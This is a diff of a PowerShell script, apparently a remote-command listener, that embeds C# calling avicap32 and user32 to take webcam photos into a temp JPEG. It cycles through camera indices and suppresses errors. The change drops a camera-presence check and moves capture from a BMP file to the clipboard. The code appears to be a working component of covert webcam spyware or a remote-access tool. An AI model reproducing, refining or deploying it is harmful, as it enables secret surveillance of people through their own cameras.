@@ -16,12 +16,6 @@ Write-Host "`n[+] Status: LISTENING for webcam capture commands...`n" -Foregroun
 
 # Function to capture photo from webcam using Windows API
 Function Capture-Webcam {
-    $cams = Get-CimInstance Win32_PnPEntity -Filter "PNPClass='Camera' or PNPClass='Image'" -ErrorAction SilentlyContinue
-    if (-not $cams) {
-        Write-Host "[-] No camera hardware detected on this PC." -ForegroundColor Yellow
-        return $null
-    }
-
     $tempFile = "$env:TEMP\webcam_capture_$([DateTimeOffset]::UtcNow.ToUnixTimeSeconds()).jpg"
     
     $code = @"
@@ -30,12 +24,12 @@ Function Capture-Webcam {
     using System.Drawing;
     using System.Drawing.Imaging;
     using System.Windows.Forms;
+    using System.Threading;
 
     public class WebCamCapture {
         [DllImport("avicap32.dll", EntryPoint = "capCreateCaptureWindowA")]
         public static extern IntPtr capCreateCaptureWindowA(string name, int style, int x, int y, int w, int h, IntPtr hWnd, int id);
         [DllImport("user32.dll")] public static extern IntPtr SendMessage(IntPtr hWnd, int msg, int wParam, int lParam);
-        [DllImport("user32.dll")] public static extern IntPtr SendMessage(IntPtr hWnd, int msg, int wParam, [MarshalAs(UnmanagedType.LPStr)] string lParam);
         [DllImport("user32.dll")] public static extern bool DestroyWindow(IntPtr hWnd);
 
         public static bool Capture(string filePath, int cameraIndex) {
@@ -47,7 +41,7 @@ Function Capture-Webcam {
             f.Show();
             Application.DoEvents();
 
-            IntPtr hWnd = capCreateCaptureWindowA("Webcam", 0x40000000 | 0x10000000, 0, 0, 640, 480, f.Handle, 1);
+            IntPtr hWnd = capCreateCaptureWindowA("Webcam", 0x50000000, 0, 0, 640, 480, f.Handle, 1);
             if (hWnd == IntPtr.Zero) { f.Close(); return false; }
 
             IntPtr conn = SendMessage(hWnd, 0x0400 + 10, cameraIndex, 0);
@@ -59,33 +53,35 @@ Function Capture-Webcam {
 
             SendMessage(hWnd, 0x0400 + 50, 1, 0);
             SendMessage(hWnd, 0x0400 + 52, 30, 0);
-            for (int i = 0; i < 15; i++) {
+            for (int i = 0; i < 10; i++) {
                 Application.DoEvents();
-                System.Threading.Thread.Sleep(100);
+                Thread.Sleep(100);
             }
 
             SendMessage(hWnd, 0x0400 + 60, 0, 0);
             Application.DoEvents();
-            System.Threading.Thread.Sleep(200);
+            Thread.Sleep(150);
 
-            string bmpPath = filePath + ".bmp";
-            SendMessage(hWnd, 0x0400 + 25, 0, bmpPath);
+            SendMessage(hWnd, 0x0400 + 41, 0, 0);
             Application.DoEvents();
+
+            bool ok = false;
+            try {
+                if (Clipboard.ContainsImage()) {
+                    using (Image img = Clipboard.GetImage()) {
+                        if (img != null) {
+                            img.Save(filePath, ImageFormat.Jpeg);
+                            ok = true;
+                        }
+                    }
+                }
+            } catch {}
 
             SendMessage(hWnd, 0x0400 + 11, 0, 0);
             DestroyWindow(hWnd);
             f.Close();
 
-            if (System.IO.File.Exists(bmpPath)) {
-                try {
-                    using (Image img = Image.FromFile(bmpPath)) {
-                        img.Save(filePath, ImageFormat.Jpeg);
-                    }
-                    System.IO.File.Delete(bmpPath);
-                    return true;
-                } catch { return false; }
-            }
-            return false;
+            return ok;
         }
     }
 "@
@@ -93,7 +89,6 @@ Function Capture-Webcam {
     Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
     Add-Type -TypeDefinition $code -ReferencedAssemblies System.Drawing, System.Windows.Forms -ErrorAction SilentlyContinue
 
-    # Try available camera indices (0 = Primary, 1 = Secondary / External USB, 2 = Tertiary)
     for ($i = 0; $i -le 2; $i++) {
         $result = [WebCamCapture]::Capture($tempFile, $i)
         if ($result -and (Test-Path $tempFile)) {
